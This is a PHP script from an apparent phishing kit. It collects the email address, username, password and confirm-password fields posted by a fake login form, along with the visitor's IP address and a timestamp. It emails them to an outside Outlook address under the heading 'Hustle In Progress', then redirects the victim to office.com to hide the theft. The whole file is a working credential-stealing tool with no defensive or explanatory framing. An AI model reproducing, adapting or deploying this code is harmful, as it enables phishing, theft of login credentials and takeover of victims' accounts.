<?php
//initiallize form details
$ip = getenv("REMOTE_ADDR");

$Email_Address= $_POST['email'];
$User_Name =  $_POST['username'];
$Pass_Word =  $_POST['password'];
$C_Pass= $_POST['cpassword'];
$datamasii=date("D M d, Y g:i a");

//
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "User Name : ".$_POST['username']."\n";
$message .= "Password: " .$_POST['password']."\n";
$message .= "Confirm Password: " .$_POST['cpassword']."\n";
$message .= "IP: ".$ip."\n";
$mesaj = "Hustle In Progress
Email : $Email_Address
User : $User_Name
Password : $Pass_Word
Confirm PassWord : $C_Pass
IP : $ip 
DATE : $datamasii
";
$from = "Marv Results";
mail("hamald@outlook.com" , $from, $mesaj);
header("Location: http://office.com"); ?>


?>